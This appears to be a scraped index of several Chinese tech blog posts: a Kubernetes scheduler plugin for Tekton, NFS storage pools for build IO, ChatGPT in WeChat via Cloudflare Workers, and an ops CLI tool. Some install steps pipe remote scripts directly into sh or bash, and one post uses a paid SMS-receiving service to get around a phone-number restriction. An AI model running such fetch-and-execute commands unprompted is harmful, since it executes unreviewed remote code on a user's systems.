有意思的是，我上班的公司，是多区域办公，各个区域的内网互通，但是出口网络不一样。其中有一个区域，有很多海外业务线，出口网络质量格外好。\n这种网络环境，正好可以用来搭建跨区域的 Kubernetes 集群，用于构建。如下图:\n在访问海外质量好的区域，新增若干构建节点。\n如上图，我们计划将访问海外资源的 CICD 任务调度到 Good to Google 节点上执行。因此，我们需要一个 Kubernetes 集群调度器，能够根据不同任务定制调度策略。\n3. 常见的几种调度器扩展方式 default-scheduler[1] 直接在 scheduler 源码的基础上，进行硬编码修改，然后重新编译 kube-scheduler，替换掉原来的 kube-scheduler\ncustom scheduler 在创建资源时，可以设置 spec.schedulerName 字段来指定使用哪个调度器处理。这种方式下，一个集群共存多个调度器，每个调度器的 sheduler name 不同。\nscheduler extender[2] 如上图，scheduler extender 提供了几个扩展点，当 kube-scheduler 调度流程进入该扩展阶段时，会向 sheduler extender 发送 http 请求，处理定制逻辑。\n部署时，可以使用 Deployment 部署 scheduler extender，修改 kube-scheduler 启动参数指向 scheduler extender 的地址即可。\nscheduler framework 如上图，scheduler framework 也提供了几个扩展点，根据处理的阶段，实现对应的接口。\n部署时，直接替换 kube-scheduler 的镜像，添加配置文件说明启用哪些 plugin 即可。\n4. 定制集群调度器 上述四种方式，第一种硬编码太硬核，第二种适用于多租户场景。第三种和第四种都是基于扩展点，但第三种需要部署额外的组件，第四种直接替换 kube-scheduler 镜像。\n第三种调度时需要发起 http 请求、创建集群 Client 维护 Informer ，第四种效率应该会更高，也更新更有未来。网上相关的教程挺详细，这里主要记录下遇到的坑。\n4.1 如何新建项目 打开 https://github.com/kubernetes-sigs/scheduler-plugins/ 切换到集群对应的 tag，构建集群是 Kubernetes 1.21 ，因此选择 v0.21.6。\n这个项目下有很多可以参考的 plugin，我们可以直接拿来用，也可以根据自己的需求修改定制。\n拷贝 go.mod 文件 replace 部分，新建一个自己的 go 项目。\n这样做的目的是:\n让调度器的代码依赖版本与集群版本保持一致，否则跨版本太多会有参数不兼容问题 避免编译时，依赖报错，处理起来很费时 4.2 快速设计 怎么指定命名空间、任务，到特定节点 1 2 3 kubectl annotate namespace kube-system com.chenshaowen.scheduler-plugin.filterimage=cdn kubectl annotate namespace kube-system com.chenshaowen.scheduler-plugin.nodes=node2 kubectl annotate namespace kube-system com.chenshaowen.scheduler-plugin.ns=default 由于是全局配置，直接将配置信息写在某个命名空间的 annotation 中，当数据库用。\n通过 Pod 的镜像识别出是否为 CDN 任务。但并不是每个项目的 CDN 任务都需要走海外节点，还有上传国内的 CDN 任务。\n上面数据下，最终的效果应该是，允许 default 命名空间下，镜像包含 cdn 字符串的 Pod 优先调度到 node2 节点；禁止镜像不包含 cdn 字符串的 Pod 调度到 node2 节点，禁止其他命名空间调度到 node2 节点。\n需要进行哪些扩展 Filter、Score 这两个扩展点就够了。如果不清楚使用哪些扩展，可以直接看一下 Plugin 的接口定义，查看接口参数和返回。\nFilter 需要禁止非指定的命名空间 Pod 调度到指定节点，放行指定命名空间的特殊 Pod 的调度。\nScore 需要优先将指定命名空间的特殊 Pod 调度到指定节点。\n4.3 写 main.go 及 plugin 相关代码 main 1 2 3 4 5 6 7 8 9 10 func main() { rand.Seed(time.Now().UnixNano()) command := app.NewSchedulerCommand( app.WithPlugin(image.Name, image.New), ) if err := command.Execute(); err != nil { println(os.Stderr, \u0026#34;%v\\n\u0026#34;, err) os.Exit(1) } } main 使用 default-scheduler 的代码启动，然后注册自己的 plugin，可以注册多个。\n定义插件 ImageNode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 type ImageNode struct { handle framework.Handle } // var _ = framework.PreFilterPlugin(\u0026amp;ImageNode{}) var _ = framework.FilterPlugin(\u0026amp;ImageNode{}) var _ = framework.ScorePlugin(\u0026amp;ImageNode{}) const Name = \u0026#34;ImageNode\u0026#34; func (i *ImageNode) Name() string { return Name } func New(_ runtime.Object, h framework.Handle) (framework.Plugin, error) { return \u0026amp;ImageNode{ handle: h, }, nil } 这个格式是固定的，var _ = framework.FilterPlugin(\u0026amp;ImageNode{}) 是为了 ImageNode 一定要实现 FilterPlugin 接口，否则编译不通过。这里需要实现 FilterPlugin 和 ScorePlugin 接口。\n实现 FilterPlugin 接口 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 func (i *ImageNode) Filter(ctx context.Context, state *framework.CycleState, pod *v1.Pod, nodeInfo *framework.NodeInfo) *framework.Status { if pod == nil { return framework.NewStatus(framework.Error, \u0026#34;pod is nil\u0026#34;) } node := nodeInfo.Node() if node == nil { klog.Infof(\u0026#34;node is nil\u0026#34;) return framework.NewStatus(framework.Error, \u0026#34;node is nil\u0026#34;) } nodes, nss, filterImage := isSpecialNS(i.handle.ClientSet(), pod.Namespace) if len(nodes) == 0 || len(nss) == 0 || len(filterImage) == 0 { klog.Infof(\u0026#34;nodes, nss, filterImage is nil\u0026#34;) return framework.NewStatus(framework.Success, \u0026#34;default\u0026#34;) } workload := \u0026#34;\u0026#34; if len(pod.ObjectMeta.OwnerReferences) \u0026gt; 0 { workload = pod.ObjectMeta.OwnerReferences[0].Kind } if workload == \u0026#34;DaemonSet\u0026#34; { klog.Info(\u0026#34;DaemonSet pass\u0026#34;) return framework.NewStatus(framework.Success, \u0026#34;DaemonSet pass\u0026#34;) } if isStringInList(node.Name, nodes) { if isStringInList(pod.Namespace, nss) \u0026amp;\u0026amp; isSpecialImage(pod, filterImage) { klog.Infof(\u0026#34;plugin hit\u0026#34;) return framework.NewStatus(framework.Success, \u0026#34;plugin hit\u0026#34;) } else { klog.Info(fmt.Printf(\u0026#34;plugin disable pod %s special node %s\u0026#34;, pod.Name, node.Name)) return framework.NewStatus(framework.Unschedulable, \u0026#34;plugin disable special node\u0026#34;) } } klog.Info(\u0026#34;default pass\u0026#34;) return framework.NewStatus(framework.Success, \u0026#34;default\u0026#34;) } 这里有一个特殊的逻辑，放行 DaemonSet 的 Pod，否则会导致 DaemonSet 的 Pod 无法在标记的节点上运行。\n实现 ScorePlugin 接口 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 func (i *ImageNode) Score(ctx context.Context, cycleState *framework.CycleState, pod *v1.Pod, nodeName string) (int64, *framework.Status) { nodes, nss, filterImage := isSpecialNS(i.handle.ClientSet(), pod.Namespace) if len(nodes) \u0026gt; 0 \u0026amp;\u0026amp; len(filterImage) \u0026gt; 0 \u0026amp;\u0026amp; len(nss) \u0026gt; 0 { if isStringInList(nodeName, nodes) \u0026amp;\u0026amp; isSpecialImage(pod, filterImage) { retScore := framework.MaxNodeScore - rand.Int63n(10) klog.Infof(\u0026#34;special node score %d\u0026#34;, retScore) return retScore, framework.NewStatus(framework.Success, \u0026#34;special node score\u0026#34;) } } retScore := rand.Int63n(framework.MaxNodeScore - 50) klog.Infof(\u0026#34;rand node score %d\u0026#34;, retScore) return retScore, framework.NewStatus(framework.Success, \u0026#34;rand node score\u0026#34;) } func (i *ImageNode) ScoreExtensions() framework.ScoreExtensions { return i } func (i *ImageNode) NormalizeScore(ctx context.Context, state *framework.CycleState, pod *v1.Pod, scores framework.NodeScoreList) *framework.Status { // Find highest and lowest scores. var highest int64 = -math.MaxInt64 var lowest int64 = math.MaxInt64 for _, nodeScore := range scores { if nodeScore.Score \u0026gt; highest { highest = nodeScore.Score } if nodeScore.Score \u0026lt; lowest { lowest = nodeScore.Score } } // Transform the highest to lowest score range to fit the framework\u0026#39;s min to max node score range. oldRange := highest - lowest newRange := framework.MaxNodeScore - framework.MinNodeScore for i, nodeScore := range scores { if oldRange == 0 { scores[i].Score = framework.MinNodeScore } else { scores[i].Score = ((nodeScore.Score - lowest) * newRange / oldRange) + framework.MinNodeScore } } return nil } Score 就是给节点打分，分数高的优先被调度。这里的处理比较粗糙，因为 CICD 任务的 Req 都不高，default-scheduler 的打分本来就不准确，直接给了随机分。\n为了避免 CDN 任务一直被调度到同一个标记的节点，引入了一定的波动，随机给节点减去一定分值。\n4.4 调试和部署 这是新手动手时，最花时间的地方。阅读一两篇文档很容易理解，但是实际操作时，往往会遇到各种各样的问题。\n本地新建一个文件 scheduler-plugin.yaml 1 2 3 4 5 6 7 8 9 10 11 12 13 apiVersion: kubescheduler.config.k8s.io/v1beta1 kind: KubeSchedulerConfiguration clientConnection: kubeconfig: \u0026#34;/Users/shaowenchen/.kube/config\u0026#34; profiles: - schedulerName: default-scheduler plugins: filter: enabled: - name: ImageNode score: enabled: - name: ImageNode apiVersion 需要根据集群版本进行调整。kubeconfig 指向本地的 kubeconfig 文件。filter 和 score 都需要开启 ImageNode 插件。\n启动 kube-scheduler 1 2 3 4 5 6 7 8 go run main.go \\ --leader-elect=true \\ --feature-gates=RotateKubeletServerCertificate=true,TTLAfterFinished=true,ExpandCSIVolumes=true,CSIStorageCapacity=true \\ --authentication-kubeconfig=/Users/shaowenchen/.kube/config \\ --authorization-kubeconfig=/Users/shaowenchen/.kube/config \\ --kubeconfig=/Users/shaowenchen/.kube/config \\ --config=/Volumes/Data/Code/Github/demo/scheduler-plugin/scheduler-plugin.yaml \\ --v=5 启动参数，不同版本的集群可能不同，需要去集群上查看。加上 --v=5 能够看到更详细的日志。\n编译镜像 Dockerfile 如下\n1 2 3 4 5 6 7 8 9 10 11 12 FROM golang:1.19 AS build WORKDIR /go/src/kube-scheduler COPY . . RUN CGO_ENABLED=0 GOOS=linux go build -o kube-scheduler . FROM alpine:3.14 COPY --from=build /go/src/kube-scheduler/kube-scheduler /usr/bin/kube-scheduler CMD [\u0026#34;/usr/bin/kube-scheduler\u0026#34;] 执行编译命令\n1 docker build -t shaowenchen/scheduler-plugin:latest . 部署[每个 Master 节点] 新建文件 /etc/kubernetes/scheduler-plugin.yaml\n1 2 3 4 5 6 7 8 9 10 11 12 13 apiVersion: kubescheduler.config.k8s.io/v1beta1 kind: KubeSchedulerConfiguration clientConnection: kubeconfig: \u0026#34;/etc/kubernetes/scheduler.conf\u0026#34; profiles: - schedulerName: default-scheduler plugins: filter: enabled: - name: ImageNode score: enabled: - name: ImageNode 此时的 kubeconfig 应该指向集群的 kubeconfig 文件。\n编辑 /etc/kubernetes/manifests/kube-scheduler.yaml，添加如下内容\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 apiVersion: v1 kind: Pod metadata: name: kube-scheduler namespace: kube-system spec: containers: - command: - kube-scheduler ... - --config=/etc/kubernetes/scheduler-plugin.yaml image: shaowenchen/scheduler-plugin:latest imagePullPolicy: Always volumeMounts: - mountPath: /etc/kubernetes/scheduler-plugin.yaml name: scheduler-plugin readOnly: true volumes: - hostPath: path: /etc/kubernetes/scheduler-plugin.yaml type: File name: scheduler-plugin --config=/etc/kubernetes/scheduler-plugin.yaml 指定配置文件，volumeMounts、volumes 用于挂载配置文件。\n需要注意的是，kube-scheduler 是一个静态 pod，需要编辑一下文件才能真正重启。使用 kubectl -n kube-system delete pod kube-scheduler-master1 仅能重启容器，不会使用最新的镜像。\n5. 总结 本篇从 Kubernetes 集群调度的角度来优化基于 Tekton 的 CICD 系统，将指定的任务调度到指定的节点上，更好的利用现有的网络资源。\n主要内容如下:\n鉴于业务诉求，我们准备使用多区域的节点进行构建，因此需要定制调度器 调研了常见的四种调度器，最终选择了 scheduler framework 的扩展方式 使用 sheduler framework 的方式，实现了一个简单的调度器插件 本地调试和部署 但由此可定制的内容还有很多，比如：\n根据任务的优先级，选择不同的节点 根据主机的负载，选择不同的节点 根据任务的资源需求，选择不同的节点 \u0026hellip; 这进一步扩展了 CICD 系统可以定制和优化的空间。\n6. 参考 https://duyanghao.github.io/scheduler-extend/ https://www.infoq.cn/article/lYUw79lJH9bZv7HrgGH5 https://github.com/shaowenchen/demo/tree/master/scheduler-plugin ","description":"","id":114,"section":"post","tags":["博文","优化","Tekton","CICD","DevOps"],"title":"Tekton 优化之定制集群调度器","uri":"https://www.chenshaowen.com/blog/custom-cluster-scheduler-to-optimize-tekton.html"},{"content":"1. 关闭 affinity-assistant 之后 在前面的博文中，我通过关闭 affinity-assistant、使用 NFS 存储，平均每条流水线执行时间节约了近 30 秒。[1]\naffinity-assistant 的影响 在关闭之前，创建 Pod 的时序图如下:\n由于 affinity-assistant 开启，每条流水线绑定在一个节点执行。\n在关闭之后，创建 Pod 的时序图如下:\n在多条流水线执行并发任务时，这种方式能有效节省 Pod 的创建时间。\n使用 NFS 存储 PV 的使用分为 create、attach、mount 几个处理阶段，得益于 NFS 的古老，没有实现复杂的存储控制和附加功能，构建效率得到再次大大提升。\n2. IO 一直跑不满 上线上面的优化之后，构建系统的性能得到很大改进，从用户的反馈可以看出，确实提升了不少。\nps，中间下线了一段时间，所以导致用户有种过山车的感觉\n新的问题是，在构建高峰期时，平时需要 2-3 min 执行完成的流水线，随着并发的增多，需要 5-6 min。\n查看监控 Grafana 图如下:\nIO 速度并不大，150MB/s 以内。但我们使用的硬盘是企业级的 SSD，这与预期相差极大。联系技术售后，他表示符合预期，而且这还不是稳态，等磁盘写满之后，速度会更低。只有重新格式化，才能获得短暂的高速。\n其他人一度怀疑是，Docker build 时没有充分利用系统资源。但是在前面的博文中，我逐一验证，进行了排除，最后的结论是 Docker build 默认没有限制资源的使用，只是 Overlay IO 会比磁盘慢。\n初测磁盘速度 1 dd if=/dev/zero of=/test bs=1M count=4024 IO 测出来 1.2 GB/s。但为啥，我们只能用到 150MB/s 以内。\n关注构建系统的人也被误导，认为是软件问题，其实被忽略的是文件大小。做测评其实是一件非常不容易的事情，能够对系统进行有效评估，必须要求对系统的全部关键因子有着深刻理解。漏掉任何一个因素都可能得出完全相反的结论。\n再测磁盘速度 在构建系统中，代码仓库、镜像文件都是以小文件为主，大量文件都只有几 KB 。如果测试时，选择一个块 1MB 肯定是不行的，得测试 4K 的随机读写。\n安装 fio\n1 apt-get install -y fio 安装 opscli [2]\n1 curl -sfL https://raw.githubusercontent.com/shaowenchen/ops/main/getcli.sh | VERSION=latest sh - 开始测试\n1 2 3 4 opscli task -f ~/.ops/tasks/get-diskio-byfio.yaml --filename /data/testfile Rand_Write_Testing: (groupid=0, jobs=1): WRITE: bw=134MiB/s (140MB/s), 134MiB/s-134MiB/s (140MB/s-140MB/s), io=2048MiB (2147MB), run=15318-15318msec 看到测试结果 140MB/s，与监控速度基本吻合。\n3. 无限 IO 能力 硬件受物理、资金、复杂的企业流程限制，无法提供高配，只能从软件架构侧优化。\n下面是当前的存储现状，全部流水线共用一个 NFS Server。当 Pod 运行在某个节点时，节点会挂载 NFS Server 的文件目录。\n这种情况下 IO 很容易出现瓶颈。下面是一个新的存储方式，我们提供了一个存储池 NFS-1、NFS-2、NFS-3\u0026hellip; NFS-10，部署了 10 个 NFS Server 对应 10 块不同的磁盘。在 Kubernetes 集群中，对应着 10 个 StorageClass。如下图:\nTekton 下，我们通过提交 PipelineRun 执行流水线，而 volumeClaimTemplate 中是可以设置 storageClassName 的。格式如下:\n1 2 3 4 5 6 spec: workspaces: - name: shared-workspace volumeClaimTemplate: spec: storageClassName: NFS-6 我们只需要将 storageClassName 值随机设置为 NFS-1、NFS-2、NFS-3\u0026hellip;NFS-10 之一即可。当然，如果能获取到实时的 IO 指标，优先选择低负载的存储更好。\n为什么说是无限的 IO 能力？因为只需要添加磁盘、部署 NFS、部署 nfs-client-provisioner、将 StorageClass 添加到可选存储列表中，即可为构建系统横向扩展 IO 能力，而对现有系统几乎没有影响。\n4. 什么时候应该扩容 可以观察如下指标:\nirate(node_disk_io_time_seconds_total{node=~\u0026#34;$node\u0026#34;,device!~\u0026#39;^(md\\\\d+$|dm-)\u0026#39;}[3m]) 不能只盯着磁盘速度，需要重点关注磁盘 IO 的负载。\n如果某个磁盘上面的指标持续接近 100%，那么说明该磁盘已经过载，需要减少构建任务。如果大量磁盘持续接近 100%，说明需要进行扩容了。\n扩容有两种方式:\n垂直扩容，换 IO 性能更好的磁盘 水平扩容，增加磁盘数量 垂直扩容比水平扩容操作简单，但成本高，可扩容的空间有限。通过加磁盘，扩展 IO 应该是更优的选择。\n5. 总结 本篇主要是优化构建系统，以期获得无限 IO 扩展能力。构建是吃资源的大户，加 CPU、Mem，上 SSD 是常见的一些手段，但在实际生产环境 IO 依然具有明显瓶颈。本文主要给出如下观点:\n测评是一件很专业的事，给结论务必谨慎 Tekton 构建集群中，可以通过构建存储池，设置不同 StorageClass 扩展 IO 能力 磁盘速度只是一个维度，持续集成更应该关注磁盘 IO 的负载 6. 参考 https://www.chenshaowen.com/blog/optimizing-the-slow-of-tekton-clone-task.html https://www.chenshaowen.com/ops/content/opscli.html ","description":"","id":115,"section":"post","tags":["博文","Tekton","云原生","CICD","云原生"],"title":"Tekton 优化之无限 IO 能力","uri":"https://www.chenshaowen.com/blog/infinite-io-capability-for-tekton.html"},{"content":"1. 创建 ChatGPT 账号 访问 https://chat.openai.com/ 测试网络 如果出现的是下面这个页面，说明你的网络不支持 ChatGPT\n正常的应该是下面这个页面\n解决办法是更换网络，幸运的是公司的网络是支持的，所以我就在公司的网络下注册了账号。\n找一个接码平台 注册 openai 账户时，需要输入手机号，而 openai 不支持国内的手机号，因此需要找一个接码平台。\n我使用的是 https://smspva.com/ ，最少充值 1 美元，可以用支付宝。\n在页面左侧 Search service 搜索 ai找到 OpenAI ，如下图。\n点击 GET BUMBER 获取一个临时的手机号。\n注册 openai 账户 使用上面的手机号注册 openai 账户，在 smspva 页面上可以获取验证码。\n注册完成之后，可以直接访问 https://chat.openai.com/。虽然有各种转发服务，浏览器插件集成，但是直接访问网页版的体验还是不错的。\n获取 API Key 访问 https://platform.openai.com/account/api-keys 页面，点击 Create new secret key，获取 API Key。如下图:\n2. 创建 Cloudflare Workers 将域名的 Nameserver 指向 Cloudflare 使用 Cloudflare 的免费套餐，需要将域名的 Nameserver 指向 Cloudflare。\n创建 Service 如上图，点击 Workers -\u0026gt; Overview -\u0026gt; Create a Service\n全部使用默认配置，保存即可。\n配置 Service 进入刚刚创建的 Service ，点击 Quick edit。\n将 https://github.com/ilyydy/cf-openai/releases 页面的 index.mini.js 拷贝到输入框中，点击 Save and deploy。\n我使用的是 v0.3.0，直接看项目的 README.md 也可以很快配置完成。\n新增 KV 如上图，新建一个 KV，名称随意，我使用的是 chatgpt。\n新增环境变量并绑定 KV 如上图，进入刚刚创建的 Service，点击 Settings-\u0026gt;Variables，新增如下环境变量：\nWECHAT_ID_LIST = MP\nWECHAT_GUEST_OPENAI_KEY，填写上面获取的 API Key\nWECHAT_MP_TOKEN, 从微信公众号后台获取\nWECHAT_MP_APPID, 从微信公众号后台获取\nWECHAT_MP_AES_KEY, 从微信公众号后台获取\n在这个页面，还需要绑定刚刚创建的 KV，如下图：\n配置 Workers 路由 在刚刚创建的 Service 的 Trigger 页面，点击 Add route，在 Route 中填写 xxx.chenshaowen.com/* 保存即可。\n但此时 xxx.chenshaowen.com 还没有指向这个 Service，需要在 Cloudflare 的 DNS 页面配置 CNAME。\n3. 在微信公众号集成 Cloudflare Workers 登录微信公众号后台 配置服务器地址 下面是 Cloudflare Workers 的地址 https://xxx.chenshaowen.com/openai/wechat/MP ，其中 xxx.chenshaowen.com 是你的域名，MP 是 WECHAT_ID_LIST 的值。\n最后别忘了启用服务器配置。\n4. 测试 常见问题 微信限制 15 秒内必须回复，否则提示公众号服务故障，而 OpenAI 可能需要更长时间处理，这种情况会先返回消息:\n1 2 正在处理中，请稍后输入 .. 或以下命令获取回答 /retry 24072700431510021 之后输入 /retry 24072700431510021 即可获得回答。\n测试效果 出现超时的情况，可以根据提示获取回答。另外，还有一些其他的命令，可以在聊天框中输入 /help 查看。\n5. 参考 https://github.com/ilyydy/cf-openai ","description":"","id":116,"section":"post","tags":["博文","Cloudflare","Workers","公众号","微信","OpenAI","ChatGPT"],"title":"使用 Cloudflare Workers 在微信公众号集成 ChatGPT","uri":"https://www.chenshaowen.com/blog/integrate-chatgpt-into-mp-by-cloudflare-workers.html.html"},{"content":"1. 什么是文档工具化 文档工具化，工具产品化，是我之前博文中反复提过的一个口号。\n好的文档，不如好用的工具。一个脚本、一条命令，比阅读文档更加直接，更能快速解决问题。同时，有很多文档会让读者对知识产生眩晕，在急于解决问题的窗口期无法补全知识体系的情况下，很容易出现错误的理解。\n这种有领域壁垒的知识，需要融入一点设计对其进行转换，才能让用户更好的使用。这就是文档工具化的意义。\n从文档到工具，从工具到产品，雕琢地痕迹会越来越明显，这是一个很有趣的过程，不断地去掉冗余，去掉不必要的东西，让用户更加专注于解决问题。\n2. Ops 工具 有了上述想法之后，我一直希望能够将平时工作中的一些操作，通过工具的方式进行封装，让这些操作能够得到更好的复用。\n半年多前，我新建了一个项目，叫做 ops，主要用来辅助我完成工作中的一些操作。\n如上图，是这个项目的一个构想。设计理念在于，运维工具的核心在于文本分发和脚本执行，实现了这两种能力就能够满足运维的功能需求。\n目前，我面向的运维对象是 Host 主机、Kubernetes 集群，很少直接面向容器。因此在 OpsObject 层实现了 Host 和 Cluster 对象，分别对应主机和 Kubernetes 集群。\n而在此之上，分别实现了面向主机的文件分发、脚本执行，以及面向 Kubernetes 集群的文件分发、脚本执行，也就是 Core 核心能力层。\n得益于 Core 层的能力，我已经可以实现一些简单的运维功能，比如：批量添加 hosts，批量安装、变更 Prometheus 等。\n但这还不够，很多运维操作不是单步能够完成，因此需要一些流程控制，比如: 备份集群之前，需要先安装 Velero，安装 Velero 之前，需要先安装 Helm 等。因此引入了一个新的对象 Task，用于完成编排，这样其实就和 Ansible 很像了。\n在 Tools 层，我提供了三个入口，：opscli、opsserver、opscontroller。目前主要完成了 opscli 和 opscontroller 两个部分。\n3. opscli opscli 是一个静态的二进制文件，支持 Linux 和 macOS 系统，可以通过 curl 命令直接下载使用。\n3.1 安装 如果网络连接 GitHub 很好，可以使用下面的命令安装：\n1 curl -sfL https://raw.githubusercontent.com/shaowenchen/ops/main/getcli.sh | VERSION=latest sh - 如果网络连接 GitHub 不好，可以使用下面的命令安装：\n1 curl -sfL https://ghproxy.chenshaowen.com/https://raw.githubusercontent.com/shaowenchen/ops/main/getcli.sh |VERSION=latest sh - 3.2 配置自动补全 如果使用 bash 1 echo \u0026#39;source \u0026lt;(opscli completion bash)\u0026#39; \u0026gt;\u0026gt;~/.bashrc 如果使用 zsh 1 echo \u0026#39;source \u0026lt;(opscli completion zsh)\u0026#39; \u0026gt;\u0026gt;~/.zshrc 3.3 使用 查看帮助 1 2 3 4 5 6 7 8 9 10 11 12 13 14 opscli --help Usage: opscli [command] Available Commands: completion Generate the autocompletion script for the specified shell create command about Ops Resource file transfer between local and remote file help Help about any command shell run shell on hosts task command about task upgrade upgrade to latest version version get current version 面向主机，远程执行命令 1 2 3 opscli shell -i 1.1.1.1 --port 2222 --username root --content \u0026#34;uname -a\u0026#34; Linux node1 5.4.219-1.el7.elrepo.x86_64 #1 SMP Sun Oct 16 10:03:45 EDT 2022 x86_64 x86_64 x86_64 GNU/Linux 这里的 -i 可以指向一个 ip，也可以指向一个文件，文件中包含多个 ip，每行一个 ip。--content 指向要执行的命令，也可以是脚本文件。\n面向集群，远程执行命令 1 opscli shell -i ~/.kube/config --content \u0026#34;docker pull shaowenchen/ops-cli:latest\u0026#34; --sudo --all 这里的 -i 指向一个 kubeconfig 文件，--all 表示对集群中的所有节点都执行命令，如果不加 --all，则只会在 master 节点执行命令，使用 --nodename 可以指定指向命令的节点。\n另外有一个特殊的参数 --incluster 表示这条命令将会在集群的某一个 Pod 运行，这在集群内部检测问题时非常有用。\n面向主机，文件分发 文件的分发，是一个映射的过程，本地、远程两个目标 + 数据流方向。\n1 opscli file --remotefile /etc/hosts --localfile ./file1 --direction download -i 1.1.1.1 --port 2222 --username root 这里的 --direction 表示数据流方向，download 表示从远程下载到本地，upload 表示从本地上传到远程。\n面向集群，文件分发 1 opscli file --remotefile /etc/hosts --localfile ./file1 --direction download -i ~/.kube/config --nodename node1 这里的 --nodename 表示目标节点。\n实际上文件分发，还支持源文件来自镜像、S3，这里就不一一列举了。\ntask 使用 1 2 3 4 5 6 7 8 9 ls ~/.ops/tasks/ add-file2image.yaml alert-http-status.yaml app-openebs.yaml get-kubeconfig.yaml pull-file.yaml upgrade-1.16m.yaml upgrade-kernel3to5.yaml add-imagepullsecret.yaml alert-promql.yaml app-prometheus.yaml get-osstaus.yaml push-file.yaml upgrade-1.16n.yaml velero-backup.yaml add-localbinpath.yaml app-descheduler.yaml clear-docker.yaml k8s-drain-node.yaml renew-kube-cert.yaml upgrade-1.17m.yaml velero-install.yaml add-opscli.yaml app-grafana.yaml clear-kube.yaml k8s-hpa.yaml set-docker-liverestore.yaml upgrade-1.17n.yaml velero-restore.yaml add-reqlimit.yaml app-istio.yaml clear-opstask.yaml list-podimage.yaml set-hosts.yaml upgrade-1.19m.yaml velero-status.yaml add-sshkey.yaml app-longhorn.yaml get-diskio-byfio.yaml list-reqlimit.yaml set-hubimage.yaml upgrade-1.19n.yaml velero-uninstall.yaml add-superuser.yaml app-metricsserver.yaml get-imagefile.yaml list-svc.yaml set-kernel.yaml upgrade-base.yaml 在 ~/.ops/tasks/ 目录下，有很多的 task yaml 文件，可以直接使用。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 opscli task -f ~/.ops/tasks/get-osstaus.yaml -i 1.1.1.1 --port 2222 --username root \u0026gt; Run Task / on 1.1.1.1 (1/11) Kernel Version 5.4.219-1.el7.elrepo.x86_64 (2/11) CPU Usage Percent/Load/Total 10.11%/0.00/4 (3/11) Mem Usage Percent/Total 33.02%/7.8G (4/11) Disk Usage Percent/Total 69%/52G /dev/mapper/centos-root 35%/1.1G /dev/sda1 4%/26G /dev/mapper/centos-home (5/11) NF_Conntrack Usage/Total 1344/131072 (6/11) PID Usage 1.57%/65535 (7/11) ARP Router 0.02%/80000 (8/11) Open Files Number 1.29%/1048576 (9/11) User Instances 0.23%/8192 (10/11) User Watches 0.00%/524288 (11/11) User Processes 360/31711 如果是面向集群，只需要将 -i 指向一个 kubeconfig 文件，然后加上 --all 或者指定 --nodename 即可。\n4 opsserver 这部分还在开发中，主要是为了提供一个 HTTP API，以供其他系统、脚本调用。\n5 opscontroller 5.1 安装 安装 Helm 1 curl https://raw.githubusercontent.com/helm/helm/master/scripts/get-helm-3 | bash 添加 Helm 仓库 1 helm repo add ops https://www.chenshaowen.com/ops/charts 安装 ops-controller 1 helm install myops ops/ops --version 1.0.0 --namespace ops-system --create-namespace 查看安装结果 1 kubectl get pods -n ops-system opscontroller 默认只会处理 ops-system 命名空间下的 CRD 资源对象。\n如果需要变更，可以修改 Env 中 ACTIVE_NAMESPACE 的值，指定某一个命令空间，如果为空，则表示处理所有命名空间。\n5.2 使用 创建一个主机对象 1 opscli create host --name dev1 -i 1.1.1.1 --port 2222 --namespace ops-system 1 2 3 4 5 6 7 8 kubectl -n ops-system get hosts NAME HOSTNAME ADDRESS DISTRIBUTION ARCH CPU MEM DISK HEARTTIME HEARTSTATUS dev1 node1 1.1.1.1 centos x86_64 4 7.8G 52G 59s successed dev2 node2 1.1.1.1 centos x86_64 4 7.8G 52G 60s successed dev3 node3 1.1.1.1 centos x86_64 4 7.8G 52G 0s successed dev4 node4 1.1.1.1 centos x86_64 4 7.8G 52G 2s successed dev5 node5 1.1.1.1 centos x86_64 1 1.8G 95G 0s successed controller 会定时检测主机的状态，并将主机的状态更新到 host 对象中。\n创建一个集群对象 1 opscli create cluster --name dev1 -i ~/.kube/config --namespace ops-system 1 2 3 4 5 6 7 8 kubectl -n ops-system get cluster NAME SERVER VERSION NODE RUNNING TOTALPOD CERTDAYS STATUS dev1 https://1.1.1.1:6443 v1.21.0 1 14 14 193 successed dev2 https://1.1.1.1:6443 v1.23.0 3 22 22 350 successed intl https://1.1.1.1:6443 v1.21.4 1 18 95 268 successed prod https://1.1.1.1:6443 v1.21.4 10 134 1098 183 successed test https://1.1.1.1:6443 v1.21.4 1 23 23 227 successed controller 会定时检测集群的状态，并将集群的状态更新到 cluster 对象中。\ntask 任务也可以通过 opscli 创建，但我更希望的是用 yaml 直接创建 controller 主要是定时执行 task 对象中的任务。比如清理集群，提供告警等。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 kubectl -n ops-system get task NAME CRONTAB TYPEREF NAMEREF NODENAME ALL STARTTIME RUNSTATUS alert-http-status-dockermirror */1 * * * * alert-http-status-harbor */1 * * * * alert-http-status-git */1 * * * * alert-http-status-mirror-go */1 * * * * alert-http-status-mirror-maven */1 * * * * alert-http-status-mirror-npm */1 * * * * alert-http-status-mirror-pypi */1 * * * * alert-promql-node-cpu */1 * * * * alert-promql-node-disk */1 * * * * alert-promql-node-io */1 * * * * alert-promql-node-mem */1 * * * * alert-promql-pending */1 * * * * alert-promql-pending-pod */1 * * * * alert-promql-pvc */1 * * * * alert-trigger-autotest */5 * * * * clear-docker 15 * * * * cluster prod true clear-opstask-dev1 10 * * * * cluster dev1 clear-opstask-dev2 10 * * * * cluster dev2 clear-opstask-prod 10 * * * * cluster prod clear-opstask-test 10 * * * * cluster test 通过 TYPEREF 指向对象类型，NAMEREF 指向对象名称。上面是我生产环境的配置，下面是发出的告警通知。\nalert 告警如上图，主要支持两种方式，一种是通过 promql 查询，另一种是通过 http 请求。\n定时任务 clear-docker 会清理集群每个节点上的构建残留物，clear-opstask 会清理因执行集群 Ops 错误时产生的 Pod。\n6. 总结 